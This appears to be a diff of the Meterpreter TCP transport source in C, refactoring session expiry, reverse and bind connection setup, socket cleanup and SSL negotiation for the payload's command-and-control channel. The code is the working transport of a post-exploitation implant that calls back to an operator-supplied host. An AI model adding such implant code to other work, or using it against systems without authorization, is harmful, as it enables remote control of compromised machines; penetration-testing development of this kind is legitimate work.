@@ -25,10 +25,9 @@ static LOCK ** ssl_locks = NULL;
  * @param sockAddrSize The size of the \c sockAddr structure.
  * @param retryTotal The number of seconds to continually retry for.
  * @param retryWait The number of seconds between each connect attempt.
- * @param expiry The session expiry time.
  * @return Indication of success or failure.
  */
-static DWORD reverse_tcp_run(SOCKET reverseSocket, SOCKADDR* sockAddr, int sockAddrSize, DWORD retryTotal, DWORD retryWait, int expiry)
+static DWORD reverse_tcp_run(SOCKET reverseSocket, SOCKADDR* sockAddr, int sockAddrSize, DWORD retryTotal, DWORD retryWait)
 {
 	DWORD result = ERROR_SUCCESS;
 	int start = current_unix_timestamp();
@@ -36,12 +35,6 @@ static DWORD reverse_tcp_run(SOCKET reverseSocket, SOCKADDR* sockAddr, int sockA
 	{
 		int retryStart = current_unix_timestamp();
 		if ((result = connect(reverseSocket, sockAddr, sockAddrSize)) != SOCKET_ERROR)
-		{
-			break;
-		}
-
-		// has our session expired?
-		if (current_unix_timestamp() >= expiry)
 		{
 			break;
 		}
@@ -64,10 +57,9 @@ static DWORD reverse_tcp_run(SOCKET reverseSocket, SOCKADDR* sockAddr, int sockA
  * @param port Port number to connect to.
  * @param retryTotal The number of seconds to continually retry for.
  * @param retryWait The number of seconds between each connect attempt.
- * @param expiry The session expiry time.
  * @return Indication of success or failure.
  */
-static DWORD reverse_tcp4(const char* host, u_short port, DWORD retryTotal, DWORD retryWait, int expiry, SOCKET* socketBuffer)
+static DWORD reverse_tcp4(const char* host, u_short port, DWORD retryTotal, DWORD retryWait, SOCKET* socketBuffer)
 {
 	*socketBuffer = 0;
 
@@ -88,7 +80,7 @@ static DWORD reverse_tcp4(const char* host, u_short port, DWORD retryTotal, DWOR
 	sock.sin_family = AF_INET;
 	sock.sin_port = htons(port);
 
-	DWORD result = reverse_tcp_run(socketHandle, (SOCKADDR*)&sock, sizeof(sock), retryTotal, retryWait, expiry);
+	DWORD result = reverse_tcp_run(socketHandle, (SOCKADDR*)&sock, sizeof(sock), retryTotal, retryWait);
 
 	if (result == ERROR_SUCCESS)
 	{
@@ -105,10 +97,9 @@ static DWORD reverse_tcp4(const char* host, u_short port, DWORD retryTotal, DWOR
  * @param scopeId IPv6 scope ID.
  * @param retryTotal The number of seconds to continually retry for.
  * @param retryWait The number of seconds between each connect attempt.
- * @param expiry Session expiry time.
  * @return Indication of success or failure.
  */
-static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, DWORD retryTotal, DWORD retryWait, int expiry, SOCKET* socketBuffer)
+static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, DWORD retryTotal, DWORD retryWait, SOCKET* socketBuffer)
 {
 	*socketBuffer = 0;
 
@@ -155,12 +146,6 @@ static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, 
 				freeaddrinfo(addresses);
 				return ERROR_SUCCESS;
 			}
-		}
-
-		// has our session expired?
-		if (current_unix_timestamp() >= expiry)
-		{
-			break;
 		}
 
 		dprintf("[TCP RUN] Connection failed, sleeping for %u s", retryWait);
@@ -358,14 +343,14 @@ static void server_dynamiclock_destroy(struct CRYPTO_dynlock_value* l, const cha
  * @brief Flush all pending data on the connected socket before doing SSL.
  * @param remote Pointer to the remote instance.
  */
-static VOID server_socket_flush(Remote* remote)
+static VOID server_socket_flush(Transport* transport)
 {
-	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
+	TcpTransportContext* ctx = (TcpTransportContext*)transport->ctx;
 	fd_set fdread;
 	DWORD ret;
 	char buff[4096];
 
-	lock_acquire(remote->lock);
+	lock_acquire(transport->lock);
 
 	while (1)
 	{
@@ -396,7 +381,7 @@ static VOID server_socket_flush(Remote* remote)
 		continue;
 	}
 
-	lock_release(remote->lock);
+	lock_release(transport->lock);
 }
 
 /*!
@@ -429,14 +414,14 @@ static LONG server_socket_poll(Remote* remote, long timeout)
 
 /*!
  * @brief Initialize the OpenSSL subsystem for use in a multi threaded enviroment.
- * @param remote Pointer to the remote instance.
+ * @param transport Pointer to the transport instance.
  * @return Indication of success or failure.
  */
-static BOOL server_initialize_ssl(Remote* remote)
+static BOOL server_initialize_ssl(Transport* transport)
 {
 	int i = 0;
 
-	lock_acquire(remote->lock);
+	lock_acquire(transport->lock);
 
 	// Begin to bring up the OpenSSL subsystem...
 	CRYPTO_malloc_init();
@@ -447,7 +432,7 @@ static BOOL server_initialize_ssl(Remote* remote)
 	ssl_locks = (LOCK**)malloc(CRYPTO_num_locks() * sizeof(LOCK *));
 	if (ssl_locks == NULL)
 	{
-		lock_release(remote->lock);
+		lock_release(transport->lock);
 		return FALSE;
 	}
 
@@ -462,24 +447,24 @@ static BOOL server_initialize_ssl(Remote* remote)
 	CRYPTO_set_dynlock_lock_callback(server_dynamiclock_lock);
 	CRYPTO_set_dynlock_destroy_callback(server_dynamiclock_destroy);
 
-	lock_release(remote->lock);
+	lock_release(transport->lock);
 
 	return TRUE;
 }
 
 /*!
  * @brief Bring down the OpenSSL subsystem
- * @param remote Pointer to the remote instance.
+ * @param transport Pointer to the transport instance.
  * @return Indication of success or failure.
  */
-static BOOL server_destroy_ssl(Remote* remote)
+static BOOL server_destroy_ssl(Transport* transport)
 {
 	int i = 0;
-	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
+	TcpTransportContext* ctx = (TcpTransportContext*)transport->ctx;
 
 	dprintf("[SERVER] Destroying SSL");
 
-	lock_acquire(remote->lock);
+	lock_acquire(transport->lock);
 
 	SSL_free(ctx->ssl);
 
@@ -498,25 +483,25 @@ static BOOL server_destroy_ssl(Remote* remote)
 
 	free(ssl_locks);
 
-	lock_release(remote->lock);
+	lock_release(transport->lock);
 
 	return TRUE;
 }
 
 /*!
  * @brief Negotiate SSL on the socket.
- * @param remote Pointer to the remote instance.
+ * @param transport Pointer to the transport instance.
  * @return Indication of success or failure.
  */
-static BOOL server_negotiate_ssl(Remote *remote)
+static BOOL server_negotiate_ssl(Transport* transport)
 {
-	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
+	TcpTransportContext* ctx = (TcpTransportContext*)transport->ctx;
 	BOOL success = TRUE;
 	SOCKET fd = 0;
 	DWORD ret = 0;
 	DWORD res = 0;
 
-	lock_acquire(remote->lock);
+	lock_acquire(transport->lock);
 
 	do
 	{
@@ -564,7 +549,7 @@ static BOOL server_negotiate_ssl(Remote *remote)
 
 	} while (0);
 
-	lock_release(remote->lock);
+	lock_release(transport->lock);
 
 	dprintf("[SERVER] Completed writing the HTTP GET request: %d", ret);
 
@@ -791,10 +776,16 @@ static DWORD server_dispatch_tcp(Remote* remote, THREAD* dispatchThread)
 		{
 			// check if the communication has timed out, or the session has expired, so we should terminate the session
 			int now = current_unix_timestamp();
-			if (now > transport->expiration_end || (now - lastPacket) > transport->timeouts.comms)
+			if (now > remote->sess_expiry_end)
 			{
 				result = ERROR_SUCCESS;
-				dprintf("[DISPATCH] communications has timed out/session has ended");
+				dprintf("[DISPATCH] session has ended");
+				break;
+			}
+			else if ((now - lastPacket) > transport->timeouts.comms)
+			{
+				result = ERROR_NETWORK_NOT_AVAILABLE;
+				dprintf("[DISPATCH] communications has timed out");
 				break;
 			}
 		}
@@ -804,12 +795,6 @@ static DWORD server_dispatch_tcp(Remote* remote, THREAD* dispatchThread)
 			break;
 		}
 	}
-
-	dprintf("[DISPATCH] calling scheduler_destroy...");
-	scheduler_destroy();
-
-	dprintf("[DISPATCH] calling command_join_threads...");
-	command_join_threads();
 
 	dprintf("[DISPATCH] leaving server_dispatch.");
 
@@ -833,165 +818,83 @@ static SOCKET transport_get_socket_tcp(Transport* transport)
 
 /*!
  * @brief Destroy the TCP transport.
- * @param transport Pointer to the TCP transport to reset.
+ * @param transport Pointer to the TCP transport to destroy.
  */
-static void transport_destroy_tcp(Remote* remote)
-{
-	if (remote && remote->transport && remote->transport->type == METERPRETER_TRANSPORT_SSL)
-	{
-		dprintf("[TRANS TCP] Destroying tcp transport for url %S", remote->transport->url);
-		SAFE_FREE(remote->transport->url);
-		SAFE_FREE(remote->transport->ctx);
-		SAFE_FREE(remote->transport);
-	}
-}
-
-/*!
- * @brief Configure the TCP connnection. If it doesn't exist, go ahead and estbalish it.
- * @param transport Pointer to the TCP transport to reset.
- */
-static void transport_reset_tcp(Transport* transport)
+static void transport_destroy_tcp(Transport* transport)
 {
 	if (transport && transport->type == METERPRETER_TRANSPORT_SSL)
 	{
-		TcpTransportContext* ctx = (TcpTransportContext*)malloc(sizeof(TcpTransportContext));
-		if (ctx->fd)
-		{
-			closesocket(ctx->fd);
-		}
-		ctx->fd = 0;
+		dprintf("[TRANS TCP] Destroying tcp transport for url %S", transport->url);
+		SAFE_FREE(transport->url);
+		SAFE_FREE(transport->ctx);
+		SAFE_FREE(transport);
 	}
 }
 
 /*!
- * @brief Attempt to determine if the stager connection was a bind or reverse connection.
- * @param ctx Pointer to the current \c TcpTransportContext.
- * @param sock The socket file descriptor passed in to metsrv.
- * @remark This function always "succeeds" because the fallback case is reverse_tcp.
+ * @brief Handle cleaning up on the client socket when MSF terminates the connection.
+ * @param thread Pointer to the thread instance.
+ * @return EXIT_SUCCESS
  */
-static void infer_staged_connection_type(TcpTransportContext* ctx, SOCKET sock)
+DWORD THREADCALL cleanup_socket(THREAD* thread)
 {
-	// if we get here it means that we've been given a socket from the stager. So we need to stash
-	// that in our context. Once we've done that, we need to attempt to infer whether this conn
-	// was created via reverse or bind, so that we can do the same thing later on if the transport
-	// fails for some reason.
-	SOCKET listenSocket;
+	char buf[4];
+	int result;
+	SOCKET fd = (SOCKET)thread->parameter1;
 
-	ctx->fd = sock;
-
-	// default to reverse socket
-	ctx->bound = FALSE;
-
-	// for sockets that were handed over to us, we need to persist some information about it so that
-	// we can reconnect after failure. To support this, we need to first get the socket information
-	// which gives us addresses and port information
-	ctx->sock_desc_size = sizeof(ctx->sock_desc);
-	if (getsockname(ctx->fd, (struct sockaddr*)&ctx->sock_desc, &ctx->sock_desc_size) != SOCKET_ERROR)
+	dprintf("[TCP] waiting for disconnect from remote");
+	// loop until FD_CLOSE comes through.
+	while ((result = recv(fd, buf, sizeof(buf), 0)) != 0)
 	{
-#ifdef DEBUGTRACE
-		if (ctx->sock_desc.ss_family == AF_INET)
+		if (result < 0)
 		{
-			dprintf("[STAGED] sock name: size %u, family %u, port %u", ctx->sock_desc_size, ctx->sock_desc.ss_family, ntohs(((struct sockaddr_in*)&ctx->sock_desc)->sin_port));
+			dprintf("[TCP] something went wrong on read.");
+			break;
 		}
-		else
-		{
-			dprintf("[STAGED] sock name: size %u, family %u, port %u", ctx->sock_desc_size, ctx->sock_desc.ss_family, ntohs(((struct sockaddr_in6*)&ctx->sock_desc)->sin6_port));
-		}
-#endif
-	}
-	else
-	{
-		dprintf("[STAGED] getsockname failed: %u (%x)", GetLastError(), GetLastError());
 	}
 
-	// then, to be horrible, we need to figure out the direction of the connection. To do this, we will
-	// Loop backwards from our current socket FD number
-	for (int i = 1; i <= 16; ++i)
+	dprintf("[TCP] disconnect received, cleaning up");
+	closesocket(fd);
+	thread_destroy(thread);
+
+	return EXIT_SUCCESS;
+}
+
+/*!
+ * @brief Reset the given TCP connection.
+ * @param transport Pointer to the TCP transport to reset.
+ * @param shuttingDown Indication that the Metsrv instance is terminating completely.
+ */
+static void transport_reset_tcp(Transport* transport, BOOL shuttingDown)
+{
+	if (transport && transport->type == METERPRETER_TRANSPORT_SSL)
 	{
-		// Windows socket handles are always multiples of 4 apart.
-		listenSocket = ctx->fd - i * 4;
-
-		vdprintf("[STAGED] Checking socket fd %u", listenSocket);
-
-		BOOL isListening = FALSE;
-		int isListeningLen = sizeof(isListening);
-		if (getsockopt(listenSocket, SOL_SOCKET, SO_ACCEPTCONN, (char*)&isListening, &isListeningLen) == SOCKET_ERROR)
+		TcpTransportContext* ctx = (TcpTransportContext*)transport->ctx;
+		dprintf("[TCP] Resetting transport from %u", ctx->fd);
+		if (ctx->fd)
 		{
-			dprintf("[STAGED] Couldn't get socket option to see if socket was listening: %u %x", GetLastError(), GetLastError());
-			continue;
-		}
-
-		if (!isListening)
-		{
-			dprintf("[STAGED] Socket appears to NOT be listening");
-			continue;
-		}
-
-		// try to get details of the socket address
-		struct sockaddr_storage listenStorage;
-		int listenStorageSize = sizeof(listenStorage);
-		if (getsockname(listenSocket, (struct sockaddr*)&listenStorage, &listenStorageSize) == SOCKET_ERROR)
-		{
-			vdprintf("[STAGED] Socket fd %u invalid: %u %x", listenSocket, GetLastError(), GetLastError());
-			continue;
-		}
-
-		// on finding a socket, see if it matches the family of our current socket
-		if (listenStorage.ss_family != ctx->sock_desc.ss_family)
-		{
-			vdprintf("[STAGED] Socket fd %u isn't the right family, it's %u", listenSocket, listenStorage.ss_family);
-			continue;
-		}
-
-		// if it's the same, and we are on the same local port, we can assume that there's a bind listener
-		if (listenStorage.ss_family == AF_INET)
-		{
-			if (((struct sockaddr_in*)&listenStorage)->sin_port == ((struct sockaddr_in*)&ctx->sock_desc)->sin_port)
+			if (shuttingDown)
 			{
-				vdprintf("[STAGED] Connection appears to be an IPv4 bind connection on port %u", ntohs(((struct sockaddr_in*)&listenStorage)->sin_port));
-				ctx->bound = TRUE;
-				break;
+				dprintf("[TCP] Transport is shutting down");
+				// we can terminate right here, given that we're closing up
+				closesocket(ctx->fd);
 			}
-			vdprintf("[STAGED] Socket fd %u isn't listening on the same port", listenSocket);
-		}
-		else if (listenStorage.ss_family == AF_INET6)
-		{
-			if (((struct sockaddr_in6*)&listenStorage)->sin6_port != ((struct sockaddr_in6*)&ctx->sock_desc)->sin6_port)
+			else
 			{
-				vdprintf("[STAGED] Connection appears to be an IPv6 bind connection on port %u", ntohs(((struct sockaddr_in6*)&listenStorage)->sin6_port));
-				ctx->bound = TRUE;
-				break;
+				// Thanks to the fact that we know we can't rely on Windows to flush the socket nicely
+				// we can't just call "closesocket" on the socket. If we do, we could lose packets that
+				// cause MSF to be rather unhappy (and it hangs as a result of not getting a response).
+				// Instead of this, we create a new thread which monitors the socket handle. We know that
+				// MSF will terminate that connection when resetting, and so we wait for that termination
+				// before cleaning up the socket. This is done in another thread so that functionality
+				// can continue.
+				dprintf("[TCP] It should now be safe to close the socket.");
+				THREAD* t = thread_create(cleanup_socket, (LPVOID)ctx->fd, NULL, NULL);
+				thread_run(t);
 			}
-			vdprintf("[STAGED] Socket fd %u isn't listening on the same port", listenSocket);
 		}
-	}
-
-	if (ctx->bound)
-	{
-		// store the details of the listen socket so that we can use it again
-		ctx->sock_desc_size = sizeof(ctx->sock_desc);
-		getsockname(listenSocket, (struct sockaddr*)&ctx->sock_desc, &ctx->sock_desc_size);
-
-		// the listen socket that we have been given needs to be tidied up because
-		// the stager doesn't do it
-		closesocket(listenSocket);
-	}
-	else
-	{
-		// if we get here, we assume reverse_tcp, and so we need the peername data to connect back to
-		vdprintf("[STAGED] Connection appears to be a reverse connection");
-		ctx->sock_desc_size = sizeof(ctx->sock_desc);
-		getpeername(ctx->fd, (struct sockaddr*)&ctx->sock_desc, &ctx->sock_desc_size);
-#ifdef DEBUGTRACE
-		if (ctx->sock_desc.ss_family == AF_INET)
-		{
-			dprintf("[STAGED] sock name: size %u, family %u, port %u", ctx->sock_desc_size, ctx->sock_desc.ss_family, ntohs(((struct sockaddr_in*)&ctx->sock_desc)->sin_port));
-		}
-		else
-		{
-			dprintf("[STAGED] sock name: size %u, family %u, port %u", ctx->sock_desc_size, ctx->sock_desc.ss_family, ntohs(((struct sockaddr_in6*)&ctx->sock_desc)->sin6_port));
-		}
-#endif
+		ctx->fd = 0;
+		dprintf("[TCP] Transport 0x%p is now reset to %u", transport, ctx->fd);
 	}
 }
 
@@ -1001,89 +904,63 @@ static void infer_staged_connection_type(TcpTransportContext* ctx, SOCKET sock)
  * @param sock Reference to the original socket FD passed to metsrv.
  * @return Indication of success or failure.
  */
-static BOOL configure_tcp_connection(Remote* remote, SOCKET sock)
+static BOOL configure_tcp_connection(Transport* transport)
 {
 	DWORD result = ERROR_SUCCESS;
 	size_t charsConverted;
 	char asciiUrl[512];
-	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
+	TcpTransportContext* ctx = (TcpTransportContext*)transport->ctx;
 
-	wcstombs_s(&charsConverted, asciiUrl, sizeof(asciiUrl), remote->transport->url, sizeof(asciiUrl)-1);
-
-	dprintf("[TCP CONFIGURE] Url: %S", remote->transport->url);
-
-	remote->transport->start_time = current_unix_timestamp();
-	remote->transport->comms_last_packet = current_unix_timestamp();
-
-	if (strncmp(asciiUrl, "tcp", 3) == 0)
+	// check if comms is already open via a staged payload
+	if (ctx->fd)
 	{
-		char* pHost = strstr(asciiUrl, "//") + 2;
-		char* pPort = strrchr(pHost, ':') + 1;
-
-		// check if we're using IPv6
-		if (asciiUrl[3] == '6')
-		{
-			char* pScopeId = strrchr(pHost, '?') + 1;
-			*(pScopeId - 1) = '\0';
-			*(pPort - 1) = '\0';
-			dprintf("[STAGELESS] IPv6 host %s port %S scopeid %S", pHost, pPort, pScopeId);
-			result = reverse_tcp6(pHost, pPort, atol(pScopeId), remote->transport->timeouts.retry_total,
-				remote->transport->timeouts.retry_wait, remote->transport->expiration_end, &ctx->fd);
-		}
-		else
-		{
-			u_short usPort = (u_short)atoi(pPort);
-
-			// if no host is specified, then we can assume that this is a bind payload, otherwise
-			// we'll assume that the payload is a reverse_tcp one and the given host is valid
-			if (*pHost == ':')
-			{
-				dprintf("[STAGELESS] IPv4 bind port %s", pPort);
-				result = bind_tcp(usPort, &ctx->fd);
-			}
-			else
-			{
-				*(pPort - 1) = '\0';
-				dprintf("[STAGELESS] IPv4 host %s port %s", pHost, pPort);
-				result = reverse_tcp4(pHost, usPort, remote->transport->timeouts.retry_total, remote->transport->timeouts.retry_wait,
-					remote->transport->expiration_end, &ctx->fd);
-			}
-		}
-	}
-	else if (ctx->sock_desc_size > 0)
-	{
-		dprintf("[STAGED] Attempted to reconnect based on inference from previous staged connection (size %u)", ctx->sock_desc_size);
-
-		// check if we should do bind() or reverse()
-		if (ctx->bound)
-		{
-			dprintf("[STAGED] previous connection was a bind connection");
-			SOCKET listenSocket = socket(ctx->sock_desc.ss_family, SOCK_STREAM, IPPROTO_TCP);
-
-			result = bind_tcp_run(listenSocket, (SOCKADDR*)&ctx->sock_desc, ctx->sock_desc_size, &ctx->fd);
-		}
-		else
-		{
-			dprintf("[STAGED] previous connection was a reverse connection");
-			ctx->fd = socket(ctx->sock_desc.ss_family, SOCK_STREAM, IPPROTO_TCP);
-
-			result = reverse_tcp_run(ctx->fd, (SOCKADDR*)&ctx->sock_desc, ctx->sock_desc_size,
-				remote->transport->timeouts.retry_total, remote->transport->timeouts.retry_wait,
-				remote->transport->expiration_end);
-
-			if (result != ERROR_SUCCESS)
-			{
-				ctx->fd = 0;
-			}
-		}
+		dprintf("[TCP] Connection already running on %u", ctx->fd);
 	}
 	else
 	{
-		// if we get here it means that we've been given a socket from the stager. So we need to stash
-		// that in our context. Once we've done that, we need to attempt to infer whether this conn
-		// was created via reverse or bind, so that we can do the same thing later on if the transport
-		// fails for some reason.
-		infer_staged_connection_type(ctx, sock);
+		// From here, we need to establish comms a-la stageless.
+		wcstombs_s(&charsConverted, asciiUrl, sizeof(asciiUrl), transport->url, sizeof(asciiUrl)-1);
+
+		dprintf("[TCP CONFIGURE] Url: %S", transport->url);
+
+		//transport->start_time = current_unix_timestamp();
+		transport->comms_last_packet = current_unix_timestamp();
+
+		if (strncmp(asciiUrl, "tcp", 3) == 0)
+		{
+			char* pHost = strstr(asciiUrl, "//") + 2;
+			char* pPort = strrchr(pHost, ':') + 1;
+
+			// check if we're using IPv6
+			if (asciiUrl[3] == '6')
+			{
+				char* pScopeId = strrchr(pHost, '?') + 1;
+				*(pScopeId - 1) = '\0';
+				*(pPort - 1) = '\0';
+				dprintf("[STAGELESS] IPv6 host %s port %S scopeid %S", pHost, pPort, pScopeId);
+				result = reverse_tcp6(pHost, pPort, atol(pScopeId), transport->timeouts.retry_total,
+					transport->timeouts.retry_wait, &ctx->fd);
+			}
+			else
+			{
+				u_short usPort = (u_short)atoi(pPort);
+
+				// if no host is specified, then we can assume that this is a bind payload, otherwise
+				// we'll assume that the payload is a reverse_tcp one and the given host is valid
+				if (*pHost == ':')
+				{
+					dprintf("[STAGELESS] IPv4 bind port %s", pPort);
+					result = bind_tcp(usPort, &ctx->fd);
+				}
+				else
+				{
+					*(pPort - 1) = '\0';
+					dprintf("[STAGELESS] IPv4 host %s port %s", pHost, pPort);
+					result = reverse_tcp4(pHost, usPort, transport->timeouts.retry_total,
+						transport->timeouts.retry_wait, &ctx->fd);
+				}
+			}
+		}
 	}
 
 	if (result != ERROR_SUCCESS)
@@ -1098,16 +975,18 @@ static BOOL configure_tcp_connection(Remote* remote, SOCKET sock)
 	SetHandleInformation((HANDLE)ctx->fd, HANDLE_FLAG_INHERIT, 0);
 
 	dprintf("[SERVER] Flushing the socket handle...");
-	server_socket_flush(remote);
+	server_socket_flush(transport);
+
+	transport->comms_last_packet = current_unix_timestamp();
 
 	dprintf("[SERVER] Initializing SSL...");
-	if (!server_initialize_ssl(remote))
+	if (!server_initialize_ssl(transport))
 	{
 		return FALSE;
 	}
 
 	dprintf("[SERVER] Negotiating SSL...");
-	if (!server_negotiate_ssl(remote))
+	if (!server_negotiate_ssl(transport))
 	{
 		return FALSE;
 	}
@@ -1130,6 +1009,8 @@ DWORD packet_transmit_via_ssl(Remote* remote, Packet* packet, PacketRequestCompl
 	DWORD res;
 	DWORD idx;
 	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
+
+	dprintf("[TRANSMIT] Sending packet to the server");
 
 	lock_acquire(remote->lock);
 
@@ -1247,25 +1128,41 @@ DWORD packet_transmit_via_ssl(Remote* remote, Packet* packet, PacketRequestCompl
 }
 
 /*!
+ * @brief Create a configuration block from the given transport.
+ * @param transport Transport data to create the configuration from.
+ * @return config Pointer to the config block to write to.
+ */
+void transport_write_tcp_config(Transport* transport, MetsrvTransportTcp* config)
+{
+	if (transport && config)
+	{
+		config->common.comms_timeout = transport->timeouts.comms;
+		config->common.retry_total = transport->timeouts.retry_total;
+		config->common.retry_wait = transport->timeouts.retry_wait;
+		wcsncpy(config->common.url, transport->url, URL_SIZE);
+	}
+}
+
+/*!
  * @brief Creates a new TCP transport instance.
- * @param url URL containing the transport details.
- * @param timeouts The timeout values to use for this transport.
+ * @param config The TCP configuration block.
  * @return Pointer to the newly configured/created TCP transport instance.
  */
-Transport* transport_create_tcp(wchar_t* url, TimeoutSettings* timeouts)
+Transport* transport_create_tcp(MetsrvTransportTcp* config)
 {
 	Transport* transport = (Transport*)malloc(sizeof(Transport));
 	TcpTransportContext* ctx = (TcpTransportContext*)malloc(sizeof(TcpTransportContext));
 
-	dprintf("[TRANS TCP] Creating tcp transport for url %S", url);
+	dprintf("[TRANS TCP] Creating tcp transport for url %S", config->common.url);
 
 	memset(transport, 0, sizeof(Transport));
 	memset(ctx, 0, sizeof(TcpTransportContext));
 
-	memcpy(&transport->timeouts, timeouts, sizeof(transport->timeouts));
-
 	transport->type = METERPRETER_TRANSPORT_SSL;
-	transport->url = _wcsdup(url);
+	transport->timeouts.comms = config->common.comms_timeout;
+	transport->timeouts.retry_total = config->common.retry_total;
+	transport->timeouts.retry_wait = config->common.retry_wait;
+	transport->url = _wcsdup(config->common.url);
 	transport->packet_transmit = packet_transmit_via_ssl;
 	transport->transport_init = configure_tcp_connection;
 	transport->transport_deinit = server_destroy_ssl;
@@ -1274,8 +1171,6 @@ Transport* transport_create_tcp(wchar_t* url, TimeoutSettings* timeouts)
 	transport->server_dispatch = server_dispatch_tcp;
 	transport->get_socket = transport_get_socket_tcp;
 	transport->ctx = ctx;
-	transport->expiration_end = current_unix_timestamp() + transport->timeouts.expiry;
-	transport->start_time = current_unix_timestamp();
 	transport->comms_last_packet = current_unix_timestamp();
 
 	return transport;
